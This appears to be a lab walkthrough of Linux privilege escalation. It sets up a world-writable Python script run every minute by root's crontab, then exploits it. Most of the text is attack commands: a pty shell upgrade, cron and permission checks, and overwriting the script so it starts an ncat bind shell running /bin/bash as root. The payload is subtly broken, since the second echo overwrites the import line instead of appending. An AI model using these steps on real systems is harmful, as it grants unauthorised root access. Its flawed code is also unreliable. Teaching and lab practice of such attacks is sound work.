# Privilege Escalation

## Scenario

1. Bad Permission Settings

The victim machine runs a simple python script which performs backup of files (simulated). The script is misconfigured with additional privileges.

**Content of `update.py`**

``` python
import datetime
f = open("update.txt","w+")
f.write("This file is updated at " + str(datetime.datetime.now()) + ".\n")
f.close()
```

For convenience sake, he modified the permissions of the update.py to 777 which allows anyone and everyone to READ/WRITE/EXECUTE the file.

2. Misconfiguring cron job 

The victim has configured the python script to be invoked every 1 minute.

``` bash
vim /etc/crontab
# Add the following line
# */1 * * * * root python3 /root/Desktop/hackwagon/week-4/update.py
```

## Execution

1. Checking for potential misconfigurations

The attacker has a limited shell through OS injection from one of Shopedia's API endpoint.

``` bash
# Upgrade shell
python -c 'import pty; pty.spawn("/bin/bash")'  

# Adhering to one of the more popular linux privilege escalation guides
# https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
# The attacker check for various misconfigurations in cron jobs
cat /etc/crontab
# */1 * * * * root python3 /root/Desktop/hackwagon/week-4/update.py
# There is one particular cron job that is invoked as root evert minute.
```

2. Invesigating file permissions for the misconfigured cron job

``` bash
# Read the file content of the invoked file
cat /root/Desktop/hackwagon/week-4/update.py

# Check the file permission
ls -la /root/Desktop/hackwagon/week-4/update.py
# -rwxrwxrwx 1 root root 129 Mar 26 00:12 /root/Desktop/hackwagon/week-4/update.py
# File is found to be world writable
```

3. Privilege escalation via misconfigured cron job

Since the invoked file is executed as root (superuser) and it is world writable, the attacker can modify the file to execute instructions of his/her choosing. The modified file will be executed as root every minute!

``` bash
echo 'import subprocess' > /root/Desktop/hackwagon/week-4/update.py
echo 'subprocess.run(["/usr/bin/ncat", "-nlvp", "8000", "-e", "/bin/bash"])' > /root/Desktop/hackwagon/week-4/update.py

# Wait for the next minute
# From the attacking machine, connect to the bind shell that is opened on the victim's machine.
```